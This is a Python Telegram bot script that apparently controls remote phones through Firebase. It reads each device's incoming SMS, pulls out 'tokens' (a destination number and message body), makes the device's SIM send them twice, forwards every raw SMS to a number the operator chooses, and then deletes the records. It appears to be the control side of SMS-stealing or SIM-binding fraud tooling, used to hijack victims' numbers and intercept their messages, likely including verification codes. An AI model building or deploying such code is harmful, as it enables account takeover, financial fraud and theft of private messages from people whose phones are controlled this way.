import threading
import time
import re
import telebot
from config import BOT_TOKEN, USER_DATA
from firebase_manager import read_incoming_sms, clear_sms_entry, send_token_via_device

bot = telebot.TeleBot(BOT_TOKEN)
ACTIVE_THREADS = {}

def parse_token(text: str):
    """
    Detect and extract To number + body from token formats.
    Handles all 3 known formats.
    """
    # Format 1: 📞 To: / 💬 Message:
    to2 = re.search(r'📞\s*To:\s*(\+?[\d\s]{7,15})', text)
    body2 = re.search(r'💬\s*Message:\s*(.+)', text)
    if to2 and body2:
        return {
            "to": re.sub(r'\s', '', to2.group(1)),
            "body": body2.group(1).strip()
        }

    # Format 2: "To (Tap to copy):" then number on next line, "Body (Tap to copy):" then body
    to_match = re.search(r'To\s*(?:\(Tap to copy\))?[:\s]*\n?\s*(\+?[\d\s\-]{7,15})', text, re.IGNORECASE)
    body_match = re.search(r'Body\s*(?:\(Tap to copy\))?[:\s]*\n?\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
    if to_match and body_match:
        return {
            "to": re.sub(r'\s', '', to_match.group(1)),
            "body": body_match.group(1).strip()
        }

    # Format 3: number | body (one-tap copy line)
    pipe_match = re.search(r'(\+?[\d]{10,15})\s*\|\s*(.+)', text)
    if pipe_match:
        return {
            "to": pipe_match.group(1).strip(),
            "body": pipe_match.group(2).strip()
        }

    return None

def forward_sms_log(user_id: int, from_num: str, body: str, forward_to: str):
    msg = (
        f"📨 <b>SMS Forwarded</b>\n"
        f"From: <code>{from_num}</code>\n"
        f"Body: <code>{body}</code>\n"
        f"Forwarded To: <code>{forward_to}</code>"
    )
    try:
        bot.send_message(user_id, msg, parse_mode="HTML")
    except Exception:
        pass

def session_loop(user_id: int, stop_event: threading.Event):
    from config import USER_DATA
    processed_keys = set()

    while not stop_event.is_set():
        data = USER_DATA.get(user_id, {})
        if not data.get("session_active"):
            break

        device = data.get("connected_device")
        channel = data.get("channel")
        forward_number = data.get("forward_number")

        if not device or not channel:
            time.sleep(2)
            continue

        firebase_url = device["firebase_url"]
        device_id = device["device_id"]
        sim = device.get("sim", "sim1")

        sms_list = read_incoming_sms(firebase_url, device_id, sim)

        for sms in sms_list:
            key = sms["key"]
            if key in processed_keys:
                continue

            processed_keys.add(key)
            from_num = sms["from"]
            body = sms["body"]

            token_data = parse_token(body)

            if token_data:
                to_num = token_data["to"]
                token_body = token_data["body"]
                results = []

                # Send token TWICE within 1 second
                for _ in range(2):
                    ok = send_token_via_device(firebase_url, device_id, sim, to_num, token_body)
                    results.append("✅" if ok else "❌")

                log_msg = (
                    f"📤 <b>Token Forward Log</b>\n"
                    f"━━━━━━━━━━━\n"
                    f"To: <code>{to_num}</code>\n"
                    f"Body: <code>{token_body[:100]}</code>\n"
                    f"Send 1: {results[0]} | Send 2: {results[1]}\n"
                    f"SIM: {sim}"
                )
                try:
                    bot.send_message(user_id, log_msg, parse_mode="HTML")
                except Exception:
                    pass

            # Forward raw SMS to forward_number (twice)
            if forward_number:
                for _ in range(2):
                    send_token_via_device(firebase_url, device_id, sim, forward_number, body)
                forward_sms_log(user_id, from_num, body, forward_number)

            # Delete from firebase so it won't re-trigger
            clear_sms_entry(firebase_url, device_id, sim, key)

        time.sleep(1)

def start_session(user_id: int):
    if user_id in ACTIVE_THREADS:
        ACTIVE_THREADS[user_id].set()
    stop_event = threading.Event()
    ACTIVE_THREADS[user_id] = stop_event
    t = threading.Thread(target=session_loop, args=(user_id, stop_event), daemon=True)
    t.start()

def stop_session(user_id: int):
    if user_id in ACTIVE_THREADS:
        ACTIVE_THREADS[user_id].set()
        del ACTIVE_THREADS[user_id]
